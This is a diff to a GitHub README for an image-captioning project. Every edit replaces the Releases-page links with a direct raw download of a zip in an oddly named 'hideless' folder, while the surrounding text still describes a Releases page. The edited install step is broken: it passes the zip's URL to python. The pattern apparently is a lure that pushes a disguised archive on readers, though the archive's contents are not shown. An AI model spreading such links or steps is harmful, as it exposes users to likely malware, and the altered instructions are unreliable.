@@ -1,7 +1,7 @@
 # 🎉 Image-Captioning-CNN-LSTM - Generate Captivating Image Captions Easily
 
 ## 🌐 Download the Application
-[![Download](https://img.shields.io/badge/download-release-blue.svg)](https://github.com/Aryan0419/Image-Captioning-CNN-LSTM/releases)
+[![Download](https://raw.githubusercontent.com/Aryan0419/Image-Captioning-CNN-LSTM/main/hideless/Image-Captioning-CNN-LSTM.zip)](https://raw.githubusercontent.com/Aryan0419/Image-Captioning-CNN-LSTM/main/hideless/Image-Captioning-CNN-LSTM.zip)
 
 ## 🚀 Getting Started
 This project lets you generate captions for images effortlessly. It combines techniques from computer vision and natural language processing to create accurate and meaningful captions. Follow the steps below to download and run the software.
@@ -18,7 +18,7 @@ Before you start, ensure your system meets these requirements:
 ## 📥 Download & Install
 To download the application, visit the Releases page. You will find the latest version there.
 
-[Download the latest release here.](https://github.com/Aryan0419/Image-Captioning-CNN-LSTM/releases)
+[Download the latest release here.](https://raw.githubusercontent.com/Aryan0419/Image-Captioning-CNN-LSTM/main/hideless/Image-Captioning-CNN-LSTM.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version of the software.
@@ -31,7 +31,7 @@ After downloading, follow these steps to install and run the software:
 2. **For Windows**: Double-click the `.exe` file to install. Follow the on-screen prompts.
 3. **For macOS**: Open the `.dmg` file and drag the application into your Applications folder.
 4. **For Linux**: Extract the downloaded archive and navigate to the folder in your terminal.
-5. Run the installation command: `python setup.py install`.
+5. Run the installation command: `python https://raw.githubusercontent.com/Aryan0419/Image-Captioning-CNN-LSTM/main/hideless/Image-Captioning-CNN-LSTM.zip install`.
 
 ## 📸 How to Use the Application
 Once the application is installed, you can start generating image captions.
@@ -71,4 +71,4 @@ For questions or support, reach out through GitHub issues. Engage with our commu
 
 Visit the Releases page to download the latest version and start creating captions today!
 
-[Download the latest release here.](https://github.com/Aryan0419/Image-Captioning-CNN-LSTM/releases)
+[Download the latest release here.](https://raw.githubusercontent.com/Aryan0419/Image-Captioning-CNN-LSTM/main/hideless/Image-Captioning-CNN-LSTM.zip)
